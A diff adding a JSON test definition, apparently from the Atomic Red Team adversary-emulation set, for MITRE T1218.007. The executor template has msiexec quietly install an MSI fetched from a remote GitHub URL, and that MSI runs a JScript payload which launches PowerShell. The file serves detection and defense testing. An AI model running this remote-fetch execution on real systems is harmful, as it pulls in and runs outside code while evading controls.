@@ -1,0 +1,34 @@
+{
+    "name": "Msiexec.exe - Execute Remote MSI file",
+    "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "#{msi_exe} /q /i \"#{msi_payload}\"\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1218.007",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Msiexec",
+    "source": "ART",
+    "uuid": "44a4bedf-ffe3-452e-bee4-6925ab125662",
+    "arguments": {
+        "msi_payload": {
+            "description": "MSI file to execute",
+            "type": "string",
+            "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"
+        },
+        "msi_exe": {
+            "description": "MSIExec File Path",
+            "type": "path",
+            "default": "c:\\windows\\system32\\msiexec.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
